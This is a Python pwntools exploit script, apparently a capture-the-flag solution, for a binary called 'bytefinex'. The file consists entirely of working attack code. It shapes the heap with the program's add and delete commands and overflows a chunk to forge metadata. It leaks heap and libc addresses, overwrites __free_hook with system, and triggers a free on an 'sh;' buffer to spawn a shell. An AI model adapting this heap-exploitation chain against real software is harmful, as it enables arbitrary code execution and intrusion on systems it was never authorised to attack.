#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']

elf = context.binary = ELF('./bytefinex')
libc = elf.libc

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REM:
        return remote("",)
    else:
        return process(elf.path)


io = start()
sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
#ru = lambda s : io.recvuntil(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, '\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ti      = lambda : io.interactive()


def addt(data):
	io.sendlineafter('# ', 'addt ' + data)
	return

def addc(data):
	io.sendlineafter('# ', 'addc ' + data)
	return

def chgt(hashc, data):
	io.sendlineafter('# ', 'chgt ' + hashc + ' ' + data)
	return

def chgc(hashc, data):
	io.sendlineafter('# ', 'chgc ' + hashc + ' ' + data)
	return

def showt(which_one):
	io.sendlineafter('# ', 'showt')
	for i in range(which_one + 1):
		io.recvuntil('TRANSACTION ID -> ')
	return io.recvline().strip()

def showc(which_one):
	io.sendlineafter('# ', 'showc')
	for i in range(which_one + 1):
		io.recvuntil('COIN ID = ')
	return io.recvline().strip()

def freet(hashc):
	io.sendlineafter('# ', 'delt ' + hashc)
	return

def freec(hashc):
	io.sendlineafter('# ', 'delc ' + hashc)
	return

def trans(idx):
	return showt(idx)

def coin(idx):
	return showc(idx)


one = [0x45226,0x4527a,0xf03a4,0xf1247]

addc('C'*0x30) # coin 0
addt('T'*0x88) # transaction 0
addt('T'*0x38) # transaction 1
addt('T'*0x80) # transaction 2

freec( str(showc(0).decode("iso-8859-1")) )
freet(str(showt(2).decode("iso-8859-1")) )

addt('T'*0xf0) # transaction 2
addc('C'*0x60) # coin 1

freet(str(showt(1).decode("iso-8859-1")))

addt((b'T'*0x30 + p64(0x210)).decode("iso-8859-1")) # transaction 3

freet( str(showt(0).decode("iso-8859-1")))
freet( str(showt(1).decode("iso-8859-1")))

data  = b'A'*0x120
data += p64(0x130)
data += p64(0xa0)
data += p32(12)
data += p32(0x41)
data += p64(0xb00bface)*14

addt(data.decode("iso-8859-1"))

showt(0)
input()
io.recvuntil('LABEL          -> ')
address = u64(io.recv(8)[0:6].ljust(8,b"\x00"))
heap = address - 0x480
lg('Heap',heap)

freec( str(showc(0).decode("iso-8859-1")))

addc( (p64(0x1337)+p64(heap+0x280)+b'pwn').decode("iso-8859-1") ) # coin 0

showt(0)
io.recvuntil('LABEL          -> ')
addr = u64(io.recv(8)[0:6].ljust(8,b"\x00"))
libc.address  = addr - 0x3c4b78
shell         = libc.address + one[0]
system = libc.sym["system"]
__malloc_hook = libc.sym["__free_hook"] 
lg('libc',libc.address)
lg("shell",shell)
lg("malloc_hook",__malloc_hook)

chgc( str(showc(0).decode("iso-8859-1")), (b"sh;sh;sh"+p64(__malloc_hook)).decode("iso-8859-1"))
chgt( str(showt(0).decode("iso-8859-1")), (p64(system)).decode("iso-8859-1"))

freec(str(showc(0).decode("iso-8859-1")))



io.interactive()

